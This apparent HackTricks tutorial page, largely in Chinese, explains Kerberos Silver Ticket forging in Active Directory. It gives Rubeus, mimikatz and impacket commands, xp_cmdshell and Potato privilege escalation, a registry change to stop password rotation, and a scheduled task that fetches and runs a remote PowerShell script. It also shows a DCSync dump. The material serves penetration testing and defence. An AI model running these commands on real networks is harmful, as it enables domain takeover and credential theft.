# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

**Silver Ticket** 攻击利用 Active Directory (AD) 环境中的服务票据。该方法依赖于获取 service account（例如 computer account）的 **NTLM hash**，以伪造 Ticket Granting Service (TGS) ticket。使用这个伪造的票据，攻击者可以访问网络上的特定服务，**冒充任何用户**，通常以获取管理员权限为目标。需要强调的是，使用 **AES keys** 来伪造票据在安全性和隐蔽性上更好。

> [!WARNING]
> Silver Tickets 比 Golden Tickets 更难被检测到，因为它们只需要 **hash of the service account**，而不是 krbtgt account。  
> 然而，它们仅限于所针对的特定服务。此外，仅仅窃取某个用户的密码。  
> 此外，如果你攻破了具有 SPN 的 **account's password**，你可以使用该密码为该服务创建一个 Silver Ticket，**冒充任意用户**。

For ticket crafting, different tools are employed based on the operating system:

### 在 Linux 上
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### 在 Windows 上
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
The CIFS 服务被强调为访问受害者文件系统的常见目标，但诸如 HOST 和 RPCSS 等其他服务也可以被利用来执行任务和 WMI 查询。

### 示例：MSSQL 服务 (MSSQLSvc) + Potato 提权到 SYSTEM

如果你拥有 SQL 服务账户（例如 sqlsvc）的 NTLM hash（或 AES key），你可以为 MSSQL SPN 伪造一个 TGS，并冒充任意用户访问 SQL 服务。随后，启用 xp_cmdshell 以 SQL 服务账户身份执行命令。如果该 token 拥有 SeImpersonatePrivilege，则可以链式使用 Potato 提权到 SYSTEM。
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- 如果结果上下文具有 SeImpersonatePrivilege（这对于 service accounts 通常为真），使用 Potato 变体以获取 SYSTEM：
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
关于滥用 MSSQL 并启用 xp_cmdshell 的更多细节：

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato 技术概述：

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## 可用服务

| 服务类型                                   | 服务 Silver Tickets                                                         |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>视操作系统而定，还可能有：</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>在某些情况下，你可以只请求：WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

使用 **Rubeus**，你可以使用以下参数 **请求所有** 这些票据：

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets 事件 ID

- 4624: 帐户登录
- 4634: 帐户注销
- 4672: 管理员登录

## 持久化

为了避免计算机每 30 天轮换密码，将 `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` 设置为 1，或者将 `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` 设置为大于 30 天的值，以延长机器密码的轮换周期。

## 滥用 Service tickets

在下面的示例中，假设该 ticket 是以管理员帐户冒充获取的。

### CIFS

使用该 ticket，您可以通过 **SMB** 访问 `C$` 和 `ADMIN$` 文件夹（如果暴露），并将文件复制到远程文件系统的某个位置，例如执行如下操作：
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
你还可以在主机内获取 shell，或使用 **psexec** 执行任意命令：


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### 主机

拥有此权限后，你可以在远程计算机上创建计划任务并执行任意命令：
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

使用这些票据你可以**在目标系统上执行 WMI**：
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
在以下页面找到有关 **wmiexec** 的更多信息：


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

通过对一台计算机的 winrm 访问，你可以 **访问它**，甚至获得一个 PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
查看以下页面以了解 **使用 winrm 连接远程主机的更多方法**：

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> 请注意 **winrm 必须处于活动并监听状态** 才能访问远程计算机。

### LDAP

拥有此权限后，您可以使用 **DCSync** 转储 DC 数据库：
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**了解有关 DCSync 的更多信息** 在以下页面：


{{#ref}}
dcsync.md
{{#endref}}


## 参考资料

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
